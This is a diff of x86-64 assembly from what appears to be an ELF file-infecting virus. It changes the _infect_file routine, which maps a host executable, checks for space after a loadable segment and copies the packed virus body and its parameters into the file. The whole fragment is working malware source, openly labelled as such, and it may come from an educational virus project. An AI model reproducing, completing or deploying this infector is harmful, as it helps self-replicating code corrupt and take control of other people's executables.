@@ -503,19 +503,25 @@ _infect_file: ; (string rdi, stat rsi)
 
 			add rdi, 8 * 3 ; let space for params
 
+			lea r9, [rel _params]
+			lea rax, [rel _eof]
+			sub rax, r9
+			mov r9, [r12 + 48]; statbuf.st_size
+			sub r9, rdi
+			; check not enough size
+			; (file_size - (p_offset + p_filesz) < unpacked virus size)
+			cmp r9, rax
+			jl .unmap
+
+			add rdi, r13 ; addr pointer -> mmap
+
 			xor r9, r9
 			cmp r9, [rel entry_inject]
 			jne .infected
 			; host
-
-			lea rdx, [rel _eof]
-			lea r9, [rel _params]
-			sub rdx, r9
-			cmp rsi, rdx
-			jl .unmap ; if size between PT_LOAD isn't enough -> abort
+			push rsi
 
 			; ==		copy start of the virus
-			add rdi, r13 ; addr pointer -> mmap
 			mov rax, rdi
 			push rax; save
 
@@ -535,6 +541,11 @@ _infect_file: ; (string rdi, stat rsi)
 			pop rdi; mmap
 			mov rax, rdi
 
+			pop rsi
+			add rdx, 8 * 3
+			cmp rsi, rdx
+			jl .unmap ; not enough size /w packed virus
+
 			jmp .params
 
 			.infected:
@@ -542,19 +553,17 @@ _infect_file: ; (string rdi, stat rsi)
 			cmp rsi, rdx
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
 
-			mov rdx, [rel length]
 			sub rdx, 8 * 3
 			; copy virus
-			add rdi, r13 ; addr pointer -> mmap
 			add rdi, 8 * 3
 			mov rsi, r8
 			call _ft_memcpy
 			mov rax, rdi
+			add rdx, 8 * 3
 
 			.params:
 			; add _params
 			sub rax, 8 * 3
-			add rdx, 8 * 3
 			mov [rax], rdx ; length
 			add rax, 8
 			sub rdi, r13
